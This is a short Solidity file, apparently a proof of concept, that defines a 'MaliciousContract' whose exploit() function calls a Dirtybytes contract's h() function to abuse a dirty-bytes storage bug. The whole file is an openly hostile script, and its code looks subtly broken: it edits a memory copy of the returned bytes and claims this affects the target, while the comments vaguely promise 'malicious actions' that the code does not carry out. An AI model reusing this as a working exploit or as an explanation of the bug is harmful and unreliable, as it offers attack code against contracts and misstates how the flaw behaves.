// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "./Dirtybytes.sol";

contract MaliciousContract {
    Dirtybytes public dirtybytes;

    constructor(address _dirtybytes) {
        dirtybytes = Dirtybytes(_dirtybytes);
    }

    function exploit() public {
        // Trigger the h() function to expose the dirty bytes
        bytes memory exploitedBytes = dirtybytes.h();

        // Now the exploitedBytes will contain the dirty bytes that were written to storage
        // You can now perform malicious actions with the exposed dirty bytes
        // Example: Adjust the contents of exploitedBytes or push more data
        exploitedBytes[0] = 0xFF;

        // Trigger h() again to exploit the dirty byte handling
        dirtybytes.h();
    }
}